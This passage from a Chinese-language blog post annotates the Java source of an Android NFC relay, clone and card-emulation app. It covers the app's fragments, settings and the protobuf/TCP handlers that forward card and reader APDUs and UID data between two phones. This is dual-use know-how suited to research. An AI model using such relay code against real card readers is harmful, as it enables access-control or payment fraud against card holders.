active</span></span><br><span class="line">    SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(getActivity());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine settings for sinks</span></span><br><span class="line">    <span class="keyword">boolean</span> textViewSinkActive   = prefs.getBoolean(getString(R.string.pref_key_debugWindow), <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">boolean</span> logfileSinkActive    = prefs.getBoolean(getString(R.string.pref_key_logfile), <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">boolean</span> logSessionSinkActive = prefs.getBoolean(getString(R.string.pref_key_sessionlogging), <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// try...catch...排错, 存储network中的Apdu</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (textViewSinkActive) &#123;</span><br><span class="line">            <span class="comment">// Debug window is active, activate the sink that collects data for it</span></span><br><span class="line">            mSinkManager.addSink(SinkManager.SinkType.DISPLAY_TEXTVIEW, mDebuginfo, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logfileSinkActive) &#123;</span><br><span class="line">            <span class="comment">// Logging to file is active. Generate filename from timestamp</span></span><br><span class="line">            SimpleDateFormat sdfDate = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>, Locale.US);</span><br><span class="line">            Date now = <span class="keyword">new</span> Date();</span><br><span class="line">            String strDate = sdfDate.format(now);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Initialize File Sink 保存txt log到存储空间</span></span><br><span class="line">            mSinkManager.addSink(SinkManager.SinkType.FILE, strDate + <span class="string">".txt"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logSessionSinkActive) &#123;</span><br><span class="line">            mSinkManager.addSink(SinkManager.SinkType.SESSION_LOG, getActivity());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SinkInitException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TODO Initialize and add Filters</span></span><br><span class="line">    <span class="comment">// Do the actual network connection</span></span><br><span class="line">    mConnectionClient.connect(mIP.getText().toString(), port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="tablayout-tablogic">Ⅲ. tabLayout &amp; tabLogic</h3><h4 id="pageradapter">PagerAdapter</h4><p>如果还需要在<code>MainActivity</code>中添加<code>Fragment</code>视图, 可以直接在这个类里添加就好, 修改的地方有三点:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每增加一个Fragment, return的值就+1</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每增加一个Fragment, 就在对应的position返回对应的名称, 以设置名称的值</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CharSequence <span class="title">getPageTitle</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (position == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Relay"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (position == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Clone"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (position == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Log"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (position == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"HCE"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Item "</span> + (position + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每增加一个Fragment, 就根据pos的位置return一个instance.</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Fragment <span class="title">getItem</span><span class="params">(<span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (pos) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> RelayFragment.getInstance();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> CloneFragment.getInstance();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> LoggingFragment.getInstance();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> HceFragment.getInstance();</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> RelayFragment.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="activity">Ⅳ. Activity</h3><h4 id="aboutworkaroundactivity">1. AboutWorkaroundActivity</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mWebView = (WebView) findViewById(R.id.workaroundDescWebView);</span><br><span class="line"><span class="comment">// Returns the language code of this Locale.</span></span><br><span class="line">String loc = Locale.getDefault().getLanguage();</span><br><span class="line"><span class="comment">// 检索这些资源的底层 AssetManager 存储.</span></span><br><span class="line">AssetManager mg = getResources().getAssets();</span><br><span class="line">String path = <span class="string">"html/desfire-info."</span> + loc + <span class="string">".html"</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    mg.open(path);</span><br><span class="line">    Log.i(TAG, <span class="string">"HTML exists for locale "</span> + loc + <span class="string">", using it."</span>);</span><br><span class="line">    <span class="comment">// mWebView实例加载了该目录下的html</span></span><br><span class="line">    mWebView.loadUrl(<span class="string">"file:///android_asset/"</span> + path);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">    Log.i(TAG, <span class="string">"No HTML for locale "</span> + loc + <span class="string">", using default (en)"</span>);</span><br><span class="line">    mWebView.loadUrl(<span class="string">"file:///android_asset/html/desfire-info.en.html"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="editactivity">2. EditActivity</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个Activity主要是在HCE模式下, 用来编辑数据的.</span></span><br><span class="line"><span class="comment">// 从资源中, 获取对应txt的map并放到TextView</span></span><br><span class="line">Map&lt;String,String&gt; myMap= Utils.currentMap;</span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;String,String&gt; entry:myMap.entrySet())&#123;</span><br><span class="line">    mData.add(<span class="keyword">new</span> ItemBean(entry.getKey(),entry.getValue()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 给mData listview设置Adapter</span></span><br><span class="line">mAdapter = <span class="keyword">new</span> ListViewAdapter(<span class="keyword">this</span>, mData);</span><br><span class="line">Utils.tableAdapter = mAdapter;</span><br><span class="line">mListView.setAdapter(mAdapter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加控件的监听事件</span></span><br><span class="line">mButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        mData.add(<span class="keyword">new</span> ItemBean());</span><br><span class="line">        mAdapter.notifyDataSetChanged();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="logactivity">3. LogActivity</h4><p>这个Activity用在HCE模式中查看Log的视图界面, 内容较简单, 不再细讲.</p><h4 id="mainactivity">4. MainActivity</h4><p>这个Activity是控制整个project的枢纽.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里初始化hce hook action</span></span><br><span class="line">DaemonConfiguration.Init(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">// 这里注册接收器</span></span><br><span class="line">registerReceiver(<span class="keyword">new</span> BroadcastReceiver() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, intent.getStringExtra(<span class="string">"text"</span>), Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="keyword">new</span> IntentFilter(<span class="string">"tud.seemuh.nfcgate.toaster"</span>));</span><br></pre></td></tr></table></figure><h4 id="settingactivity">5. SettingActivity</h4><p>这个Activity是<code>设置</code>界面的Activity,</p><h2 id="x02-network模块">0x02 network模块</h2><h3 id="c2cc2smeta">Ⅰ. c2c/c2s/meta</h3><p>这三个是根据protobuf序列化之后的类, 不用改, 直接调用就好.</p><h3 id="highlevelprotobufhandler">Ⅱ. HighLevelProtobufHandler</h3><p><code>HightLevelProtobufhandler</code>是`<code>HighLevelNetworkHandler</code>接口的实现。它用于控制所有的网络通信，并使用一个低级别的网络处理程序来进行实际的网络通信。在这个处理程序和各自的回调实现（在我们的例子中是<code>ProtobufCallBack</code>）中，协议本身被实现。<code>HightLevelProtobufhandler</code>保持网络连接的状态，并负责在连接断开连接时拆卸所有相关的线程，由用户请求或一般连接丢失负责。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 动态修改Button</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reactivateButtons</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// We need to pass a parameter, even though it isn't used. Otherwise, the app will crash.</span></span><br><span class="line">    <span class="keyword">new</span> UpdateUI(connectButton, UpdateUI.UpdateMethod.enableButton).execute(<span class="string">"Unfug"</span>);</span><br><span class="line">    <span class="keyword">new</span> UpdateUI(joinButton, UpdateUI.UpdateMethod.enableButton).execute(<span class="string">"Unfug"</span>);</span><br><span class="line">    <span class="keyword">new</span> UpdateUI(abortButton, UpdateUI.UpdateMethod.disableButton).execute(<span class="string">"Unfug"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setButtonTexts</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> UpdateUI(connectButton, UpdateUI.UpdateMethod.setTextButton).execute(MainActivity.createSessionMessage);</span><br><span class="line">    <span class="keyword">new</span> UpdateUI(joinButton, UpdateUI.UpdateMethod.setTextButton).execute(MainActivity.joinSessionMessage);</span><br><span class="line">    <span class="keyword">new</span> UpdateUI(resetButton, UpdateUI.UpdateMethod.setTextButton).execute(MainActivity.resetMessage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是三个比较重要的函数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// for reader</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendAPDUMessage</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 检测是否是apdu数据</span></span><br><span class="line">    <span class="keyword">if</span> (nfcdata.getType() != NfcComm.Type.NFCBytes) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">"sendApduMessage: NfcComm object does not contain NFC bytes. Doing nothing."</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 若reader mode关闭了, 则返回</span></span><br><span class="line">    <span class="keyword">if</span> (status != Status.PARTNER_READER_MODE) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">"sendAPDUMessage: Trying to send APDU message to partner who is not in reader mode. Doing nothing."</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] apdu = nfcdata.getData();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Prepare message</span></span><br><span class="line">    C2C.NFCData.Builder apduMessage = C2C.NFCData.newBuilder();</span><br><span class="line">    <span class="comment">// 给apduMessage 设置READER属性</span></span><br><span class="line">    apduMessage.setDataSource(C2C.NFCData.DataSource.READER);</span><br><span class="line">    apduMessage.setDataBytes(ByteString.copyFrom(apdu));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send prepared message</span></span><br><span class="line">    sendMessage(apduMessage.build(), MessageCase.NFCDATA);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for card</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendAPDUReply</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nfcdata.getType() != NfcComm.Type.NFCBytes) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">"sendApduReply: NfcComm object does not contain NFC bytes. Doing nothing."</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (status != Status.PARTNER_APDU_MODE) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">"sendAPDUReply: Trying to send APDU reply to partner who is not in APDU mode. Doing nothing."</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] nfcbytes = nfcdata.getData();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Build reply Protobuf</span></span><br><span class="line">    C2C.NFCData.Builder reply = C2C.NFCData.newBuilder();</span><br><span class="line">    reply.setDataBytes(ByteString.copyFrom(nfcbytes));</span><br><span class="line">    <span class="comment">// 设置CARD属性</span></span><br><span class="line">    reply.setDataSource(C2C.NFCData.DataSource.CARD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send reply</span></span><br><span class="line">    sendMessage(reply.build(), MessageCase.NFCDATA);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// it's about uid</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendAnticol</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nfcdata.getType() != NfcComm.Type.AnticolBytes) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">"sendAnticol: NfcComm object does not contain Anticol bytes. Doing nothing."</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve values</span></span><br><span class="line">    <span class="keyword">byte</span>[] config = nfcdata.getConfig().build();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Build reply protobuf</span></span><br><span class="line">    C2C.Anticol.Builder b = C2C.Anticol.newBuilder();</span><br><span class="line">    b.setCONFIG(ByteString.copyFrom(config));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO If we aren't in a session, cache this and send it as soon as a session is established?</span></span><br><span class="line">    <span class="comment">// (And delete it if the card is removed in the meantime)</span></span><br><span class="line">    sendMessage(b.build(), MessageCase.ANTICOL);</span><br><span class="line">    Log.d(TAG, <span class="string">"sendAnticol: Sent Anticol message"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="lowleveltcphandler">Ⅲ. LowLevelTCPHandler</h3><p>该类只发送和接收原始字节，所有的协议逻辑和解析分别发生在HighLevelNetworkHandler或回调实例中。原始数据按照4字节的长度发送数据, 并且通过socket把所有的数据都发送出去. <code>BufferedInputStream</code>为另一个输入流添加功能 - 即缓冲输入和支持mark和reset 方法的能力。当<code>BufferedInputStream</code> 创建时，会创建一个内部缓冲区数组。当流中的字节被读取或跳过时，内部缓冲区将根据需要从所包含的输入流中重新填充，一次处理多个字节。该mark 操作会记住输入流中的一个点，并且该reset操作会导致自从最近mark操作以来，在从所包含的输入流中获取新字节之前重新读取所有字节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] lenbytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> rcvlen = dis.read(lenbytes);</span><br><span class="line">Log.d(TAG, <span class="string">"Got "</span> + rcvlen + <span class="string">" bytes"</span>);</span><br><span class="line"><span class="keyword">int</span> len = ByteBuffer.wrap(lenbytes).getInt();</span><br><span class="line"></span><br><span class="line"><span class="comment">// read the message data</span></span><br><span class="line"><span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    Log.i(TAG, <span class="string">"Reading bytes of length:"</span> + len);</span><br><span class="line">    readBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[len];</span><br><span class="line">    <span class="keyword">int</span> read = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// read(byte[] b, int off, int len)</span></span><br><span class="line">        <span class="comment">// 将该字节输入流中的字节读入指定的字节数组，从给定的偏移量开始。</span></span><br><span class="line">        read += dis.read(readBytes, read, len-read);</span><br><span class="line">    &#125; <span class="keyword">while</span>(read &lt; len);</span><br><span class="line"></span><br><span class="line">    Log.d(TAG, <span class="string">"Read data: "</span> + Utils.bytesToHex(readBytes));</span><br><span class="line">    <span class="keyword">if</span>(mCallback != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">"Delegating to Callback."</span>);</span><br><span class="line">        Log.i(<span class="string">"readBytes: "</span>, Utils.bytesToHex(readBytes));</span><br><span class="line">        mCallback.onDataReceived(readBytes);</span><br><span class="line">        Log.d(TAG, <span class="string">"Callback finished execution."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"No callback set, saving for later"</span>);</span><br><span class="line">        getSome = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Log.e(TAG, <span class="string">"Error no postive number of bytes: "</span> + len);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Protocol error: Length information was negative or null"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="protobufcallback">Ⅳ. ProtobufCallback</h3><p>这个类里面包含卡和读卡器所有的数据流, 其中最为重要的是<code>handleWrapperMessage</code>这个函数, 如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleWrapperMessage</span><span class="params">(MetaMessage.Wrapper Wrapper)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Determine which type of Message the MetaMessage contains</span></span><br><span class="line">    <span class="keyword">if</span> (Wrapper.getMessageCase() == MessageCase.DATA) &#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"onDataReceived: MessageCase.DATA: Sending to handler"</span>);</span><br><span class="line">        handleData(Wrapper.getData());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (Wrapper.getMessageCase() == MessageCase.NFCDATA) &#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"onDataReceived: MessageCase:NFCDATA: Sending to handler"</span>);</span><br><span class="line">        handleNFCData(Wrapper.getNFCData());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (Wrapper.getMessageCase() == MessageCase.SESSION) &#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"onDataReceived: MessageCase.SESSION: Sending to handler"</span>);</span><br><span class="line">        handleSession(Wrapper.getSession());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (Wrapper.getMessageCase() == MessageCase.STATUS) &#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"onDataReceived: MessageCase.STATUS: Sending to handler"</span>);</span><br><span class="line">        handleStatus(Wrapper.getStatus());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (Wrapper.getMessageCase() == MessageCase.ANTICOL) &#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"onDataReceived: MessageCase.ANTICOL: Sending to handler"</span>);</span><br><span class="line">        handleAnticol(Wrapper.getAnticol());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">"onDataReceived: Message fits no known case! This is fucked up"</span>);</span><br><span class="line">        Handler.notifyUnknownMessageType();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数根据来自<code>LowLevelNetWorkHandler</code>的数据流, 来对该数据进一步分类, 根据特定的数据类型让特定的函数操作. 例如<code>handleNFCData</code>和<code>handleSession</code>以及<code>handleAnticol</code>. 接下来拿<code>handleNFCData</code>举例分析:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleNFCData</span><span class="params">(C2C.NFCData msg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.getDataSource() == C2C.NFCData.DataSource.READER) &#123;</span><br><span class="line">        <span class="comment">// We received a signal FROM a reader device and are required to talk TO a card.</span></span><br><span class="line">        Log.i(TAG,<span class="string">"hangleNFCData: "</span> + Utils.bytesToHex(msg.getDataBytes().toByteArray()));</span><br><span class="line">        NfcComm nfcdata = <span class="keyword">new</span> NfcComm(NfcComm.Source.HCE, msg.getDataBytes().toByteArray());</span><br><span class="line">        mNfcManager.sendToCard(nfcdata);</span><br><span class="line">    &#125; <span class="keyword">else</span>  <span class="keyword">if</span> (msg.getDataSource() == C2C.NFCData.DataSource.CARD) &#123;</span><br><span class="line">        <span class="comment">// We received a signal FROM a card and are required to talk TO a reader.</span></span><br><span class="line">        NfcComm nfcdata = <span class="keyword">new</span> NfcComm(NfcComm.Source.CARD, msg.getDataBytes().toByteArray());</span><br><span class="line">        mNfcManager.sendToReader(nfcdata);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Wait, what? This should be impossible. Are we using an old protocol version?</span></span><br><span class="line">        Log.e(TAG, <span class="string">"HandleNfcData: Received Nfc Data from unknown source =&gt; Not implemented"</span>);</span><br><span class="line">        Handler.notifyNotImplemented();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>msg</code>传入这个函数之后, 再通过<code>if...else if...else</code>对该数据进行分类, 分为<code>card</code>的数据和<code>reader</code>的数据. 最后再通过<code>sendToCard</code> 和 <code>sendRoReader</code> 函数对这些数据分流, 这两个函数在<code>NFCManager.java</code>会介绍.</p><h2 id="x03-nfc模块">0x03 nfc模块</h2><h3 id="config">Ⅰ. config</h3><ol type="1"><li><p><strong>ConfigBuilder</strong></p><p>这是一个将<code>anticol</code>进行数据格式的转换的类. 其中包含两个重要的函数<code>parse</code>和<code>build</code>, 如下所示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 